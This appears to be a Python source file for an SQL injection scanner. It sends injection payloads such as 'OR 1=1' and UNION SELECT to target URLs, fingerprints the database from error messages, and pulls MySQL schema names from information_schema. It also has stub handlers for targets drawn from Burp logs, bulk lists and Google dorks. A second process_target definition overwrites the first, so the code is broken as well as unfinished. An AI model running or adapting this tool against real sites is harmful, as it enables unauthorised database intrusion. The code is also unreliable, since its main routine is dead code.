import os

# target_handler.py
import re
import requests

def process_target(target_url):
    """
    Enhanced SQL Injection Testing and Data Extraction.
    """
    payloads = [
        "' OR 1=1 --",
        "' UNION SELECT NULL, database(), NULL --",
        "' AND 1=1 --",
        "' OR 'a'='a --",
    ]

    dbms_error_patterns = {
        "MySQL": r"SQL syntax.*MySQL",
        "PostgreSQL": r"PostgreSQL.*ERROR",
        "Microsoft SQL Server": r"Driver.* SQL Server|OLE DB.* SQL Server",
        "Oracle": r"ORA-\d{5}",
    }

    for payload in payloads:
        test_url = f"{target_url}{payload}"
        print(f"[*] Testing URL with payload: {test_url}")

        try:
            response = requests.get(test_url, timeout=10)
            response_text = response.text.lower()

            for dbms, pattern in dbms_error_patterns.items():
                if re.search(pattern, response_text):
                    print(f"[+] Vulnerability detected with payload: {payload}")
                    print(f"[+] Target seems to be running {dbms}.")
                    
                    # If vulnerable, attempt to extract data
                    print("[*] Extracting database information...")
                    if dbms == "MySQL":
                        extract_data_mysql(target_url)
                    # Add similar functions for other DBMSs if needed
                    return
            else:
                print(f"[-] No SQL injection vulnerability detected with payload: {payload}")
        except requests.exceptions.RequestException as e:
            print(f"[!] Error while testing URL {test_url}: {e}")

def extract_data_mysql(url):
    """
    Extract data from a MySQL target.
    """
    # Basic enumeration for MySQL databases
    payload = "' UNION SELECT NULL, schema_name, NULL FROM information_schema.schemata --"
    test_url = f"{url}{payload}"
    try:
        response = requests.get(test_url, timeout=10)
        if response.status_code == 200:
            print(f"[+] Extracted Data: {response.text[:500]}...\n")
        else:
            print("[-] No data extracted. The target may not be vulnerable.")
    except requests.exceptions.RequestException as e:
        print(f"[!] Error while extracting data: {e}")



# Function to handle the URL target
def handle_url(target_url):
    print(f"Processing target URL: {target_url}")
    # Add further logic for SQL Injection testing on the URL

# Function to handle direct database connection
def handle_direct_connection(connection_string):
    print(f"Processing direct connection: {connection_string}")
    # Add logic to connect to the database and perform testing

# Function to parse target(s) from a Burp/WebScarab log file
def handle_logfile(logfile_path):
    if not os.path.isfile(logfile_path):
        print(f"Error: Log file {logfile_path} not found.")
        return
    print(f"Parsing target(s) from log file: {logfile_path}")
    # Add logic to parse log file and extract targets

# Function to handle multiple targets from a bulk file
def handle_bulkfile(bulkfile_path):
    if not os.path.isfile(bulkfile_path):
        print(f"Error: Bulk file {bulkfile_path} not found.")
        return
    print(f"Processing multiple targets from bulk file: {bulkfile_path}")
    # Add logic to process each target in the bulk file

# Function to load and process an HTTP request from a file
def handle_requestfile(requestfile_path):
    if not os.path.isfile(requestfile_path):
        print(f"Error: Request file {requestfile_path} not found.")
        return
    print(f"Processing HTTP request from file: {requestfile_path}")
    # Add logic to load the HTTP request and extract targets

# Function to process Google dork results as target URLs
def handle_googledork(googledork_results):
    print(f"Processing Google dork results: {googledork_results}")
    # Add logic to process the dork results and extract target URLs

# Function to load options from a configuration file
def handle_configfile(configfile_path):
    if not os.path.isfile(configfile_path):
        print(f"Error: Config file {configfile_path} not found.")
        return
    print(f"Loading options from configuration file: {configfile_path}")
    # Add logic to load configuration and extract targets/options

# Main function to process the provided target(s)
def process_target(target_input):
    # Check what type of target input we have and process accordingly
    if target_input.startswith("http"):
        handle_url(target_input)  # URL target
    elif target_input.startswith("direct:"):
        handle_direct_connection(target_input[7:])  # Direct connection string
    elif target_input.endswith(".log"):
        handle_logfile(target_input)  # Log file
    elif target_input.endswith(".txt"):
        handle_bulkfile(target_input)  # Bulk file
    elif target_input.endswith(".req"):
        handle_requestfile(target_input)  # Request file
    elif target_input.startswith("dork:"):
        handle_googledork(target_input[5:])  # Google dork results
    elif target_input.endswith(".ini"):
        handle_configfile(target_input)  # Configuration file
    else:
        print(f"Error: Invalid target input - {target_input}")
